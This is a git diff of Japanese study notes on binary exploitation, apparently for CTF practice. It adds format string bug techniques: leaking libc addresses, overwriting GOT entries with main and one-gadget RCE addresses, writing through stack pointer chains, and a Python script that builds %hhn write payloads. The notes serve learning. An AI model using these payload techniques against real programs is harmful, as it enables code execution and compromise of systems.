@@ -361,11 +361,11 @@ takabaya-shi@takabayashi-VirtualBox:~/$
 ```
 ### format string bug
 以下のようにフォーマットが指定されていない場合に有効。   
-また、ret2pltなどでprintf関数を呼び出した際にも有効！！   
-`%p`の場所は、x64の場合は7まではrsi,rdx,..のレジスタの内容で、8以降rspになるらしいので、`sub rsp YY`と`rbp-0xXX`を対応させて逆算するらしい。   
 ```txt
 printf(buf)
 ```
+また、ret2pltなどでprintf関数を呼び出した際にも有効！！   
+`%p`の場所は、x64の場合は7まではrsi,rdx,..のレジスタの内容で、8以降rspになるらしいので、`sub rsp YY`と`rbp-0xXX`を対応させて逆算するらしい。   
 - `%p`   
 スタック上のデータをvoid\*型として16進数で表示   
 - `%n$p`   
@@ -391,6 +391,11 @@ printf(buf)
 - `%n`   
 printfが呼ばれてから%nを見つけるまでに出力された文字数を引数のポインタに書き込む   
 既知の任意のアドレスに書き込むことができる。   
+入力した文字列に対応する引数が何番目かを特定して、任意のアドレス(最後の方に呼ばれる関数のGOT領域が多い)にone-gadget-rceなどを書き込む。   
+その際に、libcのアドレスが必要なため、以下の手順を取るのが定石？   
+- [1] スタック上にあるlibc_start_mainのアドレスをリーク (1回目のFSB)   
+- [2] 最後に呼ばれる関数(exitなど)をmainに書き換えてループ　(1回目のFSB)   
+- [3] 最後に呼ばれる関数(exitなど)をone-gadget-rceに書き換える (2回目のFSB)   
 ```txt
 0x7fffffff_12345678に書き込みたい場合、
     \x78\x56\x34\x12\xff\xff\xff\x7f%9$n
@@ -402,11 +407,51 @@ printfが呼ばれてから%nを見つけるまでに出力された文字数を
 
 %43$nとかで、スタック上のリターンアドレスに書き込むことはできない。
 スタック上のリターンアドレスを%43$cでleakできたとしても、このアドレスを引数にとることはできない？？   
+-> できる！が、Partial RELROの場合はlibc_start_mainには書き込めない！！
 (仮にできたとしても、スタック上じゃなくてlibc_start_mainのアドレスに書き込むことになるので良くなさそう)
+-> スタック上に、スタック上のポインタがあれば、任意のアドレスに書き込める！
+例）
+0x7fffffffde90 | 0x7fffffffdff0
+       ~
+0x7fffffffdff0 | 0
+となっている場合、2回のFSBで任意のアドレスに書き込める。
+
+[1] 0x7fffffffdff0をprintfのポインタの引数として、このアドレスに0xdeadbeefを書き込む
+[2] 0xdeadbeefをprintfのポインタの引数として、このアドレスに任意の値を書き込める！
 ```
 - `%hn`   
 1バイトだけ書き込む   
+```python
+# 参考 https://kusano-k.hatenadiary.com/entry/20140302/1393781714
 
+from sys import *
+from struct import *
+T = [
+    (0x080497fc, ord('h')),
+    (0x080497fd, ord('a')),
+    (0x080497fe, ord('c')),
+    (0x080497ff, ord('k')),
+]
+
+# 書き込む文字列の先頭がprintfのoffset+1番目の引数
+offset = 4
+
+code = "".join(pack("I",t[0]) for t in T)  # "I"にすると4bytes, "l"にすると8bytes
+#"I" '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08'
+#"l" '\xfc\x97\x04\x00\x00\x00\x00\x00\xfd\x97\x84\x00\x00\x00\x00\x00\xfe\x97\x04\x08\x00\x00\x00\x00\xff\x97\x04\x08\x00\x00\x00\x00'
+
+# 出力した文字数
+n = len(code)
+
+for i in range(len(T)):
+    l = (T[i][1]-n-1)%256+1
+    code += "%{0}c%{1}$hhn".format(l, offset+i)
+    n += l
+
+print >>stderr, "code:", repr(code)
+print code
+# '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08%88c%4$hhn%249c%5$hhn%2c%6$hhn%8c%7$hhn'
+```
 ### libc leak
 #### stack上のbacktraceを利用
 stack上にはバックトレースという、エラー時にどの関数を呼んだのかをわかるようにするための情報が保存される。   
